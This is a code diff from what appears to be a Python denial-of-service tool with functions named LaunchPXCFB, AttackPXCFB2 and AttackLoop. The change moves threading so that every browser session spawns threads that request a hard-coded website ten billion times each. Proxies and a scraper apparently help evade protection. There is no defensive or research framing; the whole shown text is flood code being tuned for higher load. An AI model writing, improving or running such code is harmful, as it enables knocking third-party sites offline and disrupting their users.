@@ -585,8 +585,8 @@ def LaunchPXCFB(url, th, t):
 
         for i in range(int(th)):
             try:
-                thd = threading.Thread(target=AttackPXCFB2, args=(url, until, scraper,proxies,th))
-                thd.start()
+                AttackPXCFB2(url, until, scraper,proxies,th)
+                
 
             except:
                 print('teo--------------',proxy)
@@ -625,9 +625,9 @@ def AttackPXCFB2(url, until_datetime, scraper,proxies,th):
                 # Define the URL you want to scrape
                 url = 'https://xvideos68.com'
                 for _ in range(int(th)*10000000000):
-                    driver.get(url)
-                    # Get the page source
-                    page_source = driver.title
+                    thd = threading.Thread(target=AttackLoop, args=(driver,url))
+                    thd.start()
+                    
                     # print(page_source,'------',proxy)
                 # Close the driver
                 driver.quit()
@@ -637,7 +637,12 @@ def AttackPXCFB2(url, until_datetime, scraper,proxies,th):
             print('falid--------------',proxy,e)
             
             pass
-
+def AttackLoop(driver,url):
+    for _ in range(10000000000):
+        driver.get(url)
+        # Get the page source
+        page_source = driver.title
+        print(page_source)
 
 #region CFPRO
 def LaunchCFPRO(url, th, t):
